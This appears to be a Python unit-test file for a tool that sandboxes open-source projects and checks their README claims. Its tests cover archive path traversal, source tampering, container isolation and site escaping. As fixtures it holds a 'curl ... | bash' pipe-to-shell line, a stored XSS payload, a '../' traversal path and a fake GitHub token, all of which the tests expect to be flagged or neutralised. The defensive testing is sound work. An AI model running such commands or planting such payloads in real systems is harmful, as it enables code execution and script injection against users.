from __future__ import annotations

import copy
import hashlib
import io
import json
import os
import subprocess
import tarfile
import tempfile
import unittest
from pathlib import Path

from worthit.evaluate import compare_replays, evaluate_claims
from worthit.inspect import assess_risk, safe_extract_tar, source_tree_report
from worthit.models import Claim, TestPlan, TrustClass, atomic_json
from worthit.planning import _ensure_grounded_repair
from worthit.review import _observed_version
from worthit.runner import (
    DockerRunner,
    RunnerConfig,
    Sandbox,
    _validate_requirements,
    execution_contract_sha256,
    redact,
    vcs_version_fallback,
    verify_source_snapshot,
)
from worthit.site import build_site

ROOT = Path(__file__).resolve().parents[1]


def claim() -> Claim:
    return Claim.from_dict(
        {
            "claim_id": "CLAIM-001",
            "source": "README.md",
            "source_excerpt": "sorts files",
            "text": "The CLI sorts files.",
            "importance": "HIGH",
            "testability": "HIGH",
            "rationale": "Directly observable.",
        }
    )


def plan_raw() -> dict[str, object]:
    return {
        "core_workflow": "Sort one file.",
        "entrypoint": "tool",
        "designer": "test",
        "tests": [
            {
                "test_id": "T01",
                "claim_ids": ["CLAIM-001"],
                "purpose": "Sort a file.",
                "argv": ["{entrypoint}", "file.py"],
                "stdin": "",
                "setup_files": {"file.py": "import b\nimport a\n"},
                "expected_exit_codes": [0],
                "stdout_contains": [],
                "stderr_contains": [],
                "file_assertions": [
                    {"path": "file.py", "exists": True, "exact_text": "import a\nimport b\n", "contains": []}
                ],
                "timeout_sec": 10,
                "edge_case": False,
                "required_resources": ["CPU"],
                "evidence": ["stdout", "stderr"],
            },
            {
                "test_id": "T02",
                "claim_ids": ["CLAIM-001"],
                "purpose": "Reject a missing file.",
                "argv": ["{entrypoint}", "missing.py"],
                "stdin": "",
                "setup_files": {},
                "expected_exit_codes": [2],
                "stdout_contains": [],
                "stderr_contains": ["missing"],
                "file_assertions": [],
                "timeout_sec": 10,
                "edge_case": True,
                "required_resources": ["CPU"],
                "evidence": ["stdout", "stderr"],
            },
        ],
        "limitations": [],
    }


class CoreBoundaryTests(unittest.TestCase):
    def test_archive_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "source.tar.gz"
            with tarfile.open(archive, "w:gz") as bundle:
                member = tarfile.TarInfo("repo/../escape.txt")
                member.size = 4
                bundle.addfile(member, io.BytesIO(b"nope"))
            with self.assertRaises(ValueError):
                safe_extract_tar(archive, Path(temporary) / "output")
            self.assertFalse((Path(temporary) / "escape.txt").exists())

    def test_source_snapshot_detects_tampering(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            source = root / "source"
            source.mkdir()
            candidate = source / "tool.py"
            candidate.write_text("print('data only')\n")
            archive = root / "source.tar.gz"
            archive.write_bytes(b"trusted transport bytes")
            tree = source_tree_report(source)
            repository = {
                "commit_sha": "a" * 40,
                "archive_sha256": hashlib.sha256(archive.read_bytes()).hexdigest(),
                "source_tree_sha256": tree["sha256"],
                "source_files": tree["files"],
                "source_bytes": tree["bytes"],
            }
            self.assertFalse(verify_source_snapshot(source, archive, repository)["git_parser_on_host"])
            candidate.write_text("print('changed')\n")
            with self.assertRaises(ValueError):
                verify_source_snapshot(source, archive, repository)

    def test_model_rejects_path_escape_and_host_command(self) -> None:
        raw = plan_raw()
        raw["tests"][0]["setup_files"] = {"../escape": "bad"}  # type: ignore[index]
        with self.assertRaises(ValueError):
            TestPlan.from_dict(raw, [claim()], "test")
        raw = plan_raw()
        raw["tests"][0]["argv"] = ["sh", "-c", "true"]  # type: ignore[index]
        with self.assertRaises(ValueError):
            TestPlan.from_dict(raw, [claim()], "test")

    def test_risk_gate_flags_pipe_to_shell(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            source = Path(temporary)
            (source / "install.sh").write_text("curl https://example.invalid/x | bash\n")
            report = assess_risk(
                source,
                {
                    "license": "MIT",
                    "created_at": "2020-01-01T00:00:00Z",
                    "stars": 5_000,
                    "contributors_sample": 10,
                },
            )
            self.assertEqual(report.classification, TrustClass.REVIEW)
            self.assertIn("pipe_to_shell", {finding.category for finding in report.findings})

    def test_runner_command_has_no_mount_socket_network_or_caps(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            sandbox = Sandbox(Path(temporary), RunnerConfig(allow_runc=True), "runc", "test")
            argv = sandbox.create_argv()
            self.assertEqual(argv[argv.index("--network") + 1], "none")
            self.assertEqual(argv[argv.index("--cap-drop") + 1], "ALL")
            self.assertNotIn("--volume", argv)
            self.assertNotIn("--mount", argv)
            self.assertFalse(any("docker.sock" in value for value in argv))

    def test_requirement_and_secret_boundaries(self) -> None:
        self.assertEqual(
            _validate_requirements(["hatchling>=1.0", "packaging"]), ["hatchling>=1.0", "packaging"]
        )
        for unsafe in ("tool @ https://example.invalid/tool.whl", "../tool", "git+https://example.invalid/x"):
            with self.assertRaises(RuntimeError):
                _validate_requirements([unsafe])
        token = "ghp_" + "x" * 40
        cleaned = redact(f"{token} {Path.home()}/secret")
        self.assertNotIn(token, cleaned)
        self.assertNotIn(str(Path.home()), cleaned)
        fallback, adjustments = vcs_version_fallback(
            {
                "build_requires": ["hatch-vcs>=0.4"],
                "dynamic": ["version"],
                "project_name": "demo-tool",
            },
            "a" * 40,
        )
        self.assertEqual(
            fallback,
            {
                "SETUPTOOLS_SCM_PRETEND_VERSION": "0+worthit.aaaaaaaaaaaa",
                "SETUPTOOLS_SCM_PRETEND_VERSION_FOR_DEMO_TOOL": "0+worthit.aaaaaaaaaaaa",
            },
        )
        self.assertEqual(adjustments[0]["kind"], "vcs_version_fallback")

    def test_replay_comparison_detects_mismatch(self) -> None:
        run = {
            "status": "COMPLETE",
            "label": "one",
            "tests": [
                {
                    "test_id": "T01",
                    "status": "PASS",
                    "exit_code": 0,
                    "assertions": [{"assertion": "x", "passed": True}],
                }
            ],
        }
        self.assertTrue(compare_replays(run, {**copy.deepcopy(run), "label": "two"})["reproduced"])
        changed = copy.deepcopy(run)
        changed["label"] = "two"
        changed["tests"][0]["exit_code"] = 1
        self.assertFalse(compare_replays(run, changed)["reproduced"])
        contract = TestPlan.from_dict(plan_raw(), [claim()], "test")
        first = execution_contract_sha256(contract, {}, {"image_id": "one"})
        second = execution_contract_sha256(contract, {}, {"image_id": "two"})
        self.assertNotEqual(first, second)

    def test_staged_install_claim_stays_partial(self) -> None:
        install_claim = Claim.from_dict(
            {
                "claim_id": "CLAIM-001",
                "source": "README.md",
                "source_excerpt": "pip install tool",
                "text": "Running pip install tool installs the package.",
                "importance": "HIGH",
                "testability": "HIGH",
                "rationale": "Observable.",
            }
        )
        execution = {
            "status": "COMPLETE",
            "install_adjustments": [{"kind": "vcs_version_fallback"}],
            "tests": [
                {
                    "test_id": "T01",
                    "status": "PASS",
                    "evidence": ["evidence/final/T01/stdout.txt"],
                }
            ],
        }
        result = evaluate_claims(
            [install_claim], TestPlan.from_dict(plan_raw(), [install_claim], "test"), execution
        )
        self.assertEqual(result[0].status.value, "PARTIAL")

    def test_version_probe_strips_output_label(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            output = root / "version.txt"
            output.write_text("banner\nVERSION 1.2.3\n")
            execution = {"version_probe": {"exit_code": 0, "stdout_file": str(output)}}
            self.assertEqual(_observed_version(execution, root), "1.2.3")

    def test_warm_repair_requires_observed_assertions(self) -> None:
        original = TestPlan.from_dict(plan_raw(), [claim()], "initial")
        valid_raw = plan_raw()
        valid_raw["tests"][1]["expected_exit_codes"] = [0]  # type: ignore[index]
        valid_raw["tests"][1]["stderr_contains"] = ["actual error"]  # type: ignore[index]
        valid = TestPlan.from_dict(valid_raw, [claim()], "repair")
        evidence = {
            "tests": [
                {
                    "test_id": "T01",
                    "exit_code": 0,
                    "assertions": [],
                    "evidence": ["evidence/warm/T01/stdout.txt", "evidence/warm/T01/stderr.txt"],
                },
                {
                    "test_id": "T02",
                    "exit_code": 0,
                    "assertions": [],
                    "evidence": ["evidence/warm/T02/stdout.txt", "evidence/warm/T02/stderr.txt"],
                },
            ],
            "outputs": {
                "evidence/warm/T01/stdout.txt": "",
                "evidence/warm/T01/stderr.txt": "",
                "evidence/warm/T02/stdout.txt": "",
                "evidence/warm/T02/stderr.txt": "actual error",
            },
        }
        _ensure_grounded_repair(original, valid, evidence)
        weakened_raw = plan_raw()
        weakened_raw["tests"][1]["expected_exit_codes"] = [0, 2]  # type: ignore[index]
        weakened_raw["tests"][1]["stderr_contains"] = []  # type: ignore[index]
        weakened = TestPlan.from_dict(weakened_raw, [claim()], "repair")
        with self.assertRaises(ValueError):
            _ensure_grounded_repair(original, weakened, evidence)

    def test_static_site_escapes_stored_xss(self) -> None:
        template_path = next((ROOT / "reviews").rglob("review.json"))
        review = json.loads(template_path.read_text())
        attack = '</title><script>alert("x")</script><img src=x onerror=alert(1)>'
        review["project"] = attack
        review["summary"] = attack
        review["claim_matrix"][0]["claim"] = attack
        review["tests"][0]["purpose"] = attack
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            artifact = root / "reviews" / "owner" / "repo" / review["commit_sha"]
            artifact.mkdir(parents=True)
            atomic_json(artifact / "review.json", review)
            site = root / "site"
            self.assertEqual(build_site(root / "reviews", site), 1)
            rendered = next((site / "reviews").rglob("index.html")).read_text()
            self.assertNotIn("<script>", rendered)
            self.assertNotIn("<img", rendered)
            self.assertIn("&lt;script&gt;", rendered)
            review["score"]["bullshit_ratio"] = None
            atomic_json(artifact / "review.json", review)
            self.assertEqual(build_site(root / "reviews", site), 1)
            self.assertIn("Bullshit Ratio N/A", next((site / "reviews").rglob("index.html")).read_text())
            review["score"]["overall"] = attack
            atomic_json(artifact / "review.json", review)
            with self.assertRaises(ValueError):
                build_site(root / "reviews", site)

    def test_published_artifacts_contain_no_candidate_executables(self) -> None:
        forbidden = {".py", ".js", ".sh", ".whl", ".exe", ".bin", ".so"}
        self.assertFalse(
            [path for path in (ROOT / "reviews").rglob("*") if path.is_file() and path.suffix in forbidden]
        )


@unittest.skipUnless(
    os.environ.get("WORTHIT_DOCKER_TESTS") == "1", "set WORTHIT_DOCKER_TESTS=1 for isolation checks"
)
class DockerIsolationTests(unittest.TestCase):
    def test_disposable_container_has_no_secret_mount_or_network(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            run_dir = Path(temporary).resolve()
            config = RunnerConfig(allow_runc=True, test_timeout=10)
            DockerRunner(run_dir, config, TrustClass.TRUSTED).preflight()
            sandbox = Sandbox(run_dir, config, "runc", "hostile-fixture")
            sandbox.start()
            canary = "ghp_" + "z" * 40
            os.environ["WORTHIT_TEST_CANARY"] = canary
            try:
                inspected = json.loads(
                    subprocess.run(
                        ["docker", "inspect", sandbox.name],
                        text=True,
                        capture_output=True,
                        timeout=10,
                        check=True,
                    ).stdout
                )[0]
                self.assertEqual(inspected["Mounts"], [])
                self.assertEqual(inspected["HostConfig"]["NetworkMode"], "none")
                trace = sandbox.exec(
                    [
                        "/usr/local/bin/python",
                        "-I",
                        "-c",
                        "import json,os,socket,sys; s=socket.socket(); s.settimeout(.2); print(json.dumps({'env':sorted(os.environ),'socket':os.path.exists('/var/run/docker.sock'),'host_home':os.path.exists(sys.argv[1]),'network':s.connect_ex(('1.1.1.1',53))}))",
                        str(Path.home()),
                    ],
                    "/work",
                    b"",
                    5,
                    run_dir / "evidence" / "probe",
                    "probe",
                )
                output = (run_dir / trace.stdout_file).read_text()
                observation = json.loads(output)
                self.assertNotIn("WORTHIT_TEST_CANARY", observation["env"])
                self.assertNotIn(canary, output)
                self.assertFalse(observation["socket"])
                self.assertFalse(observation["host_home"])
                self.assertNotEqual(observation["network"], 0)
                timed = sandbox.exec(
                    ["/usr/local/bin/python", "-I", "-c", "import time; time.sleep(60)"],
                    "/work",
                    b"",
                    1,
                    run_dir / "evidence" / "timeout",
                    "timeout",
                )
                self.assertTrue(timed.timed_out)
            finally:
                sandbox.close()
                os.environ.pop("WORTHIT_TEST_CANARY", None)
            missing = subprocess.run(
                ["docker", "inspect", sandbox.name],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
            )
            self.assertNotEqual(missing.returncode, 0)


if __name__ == "__main__":
    unittest.main()
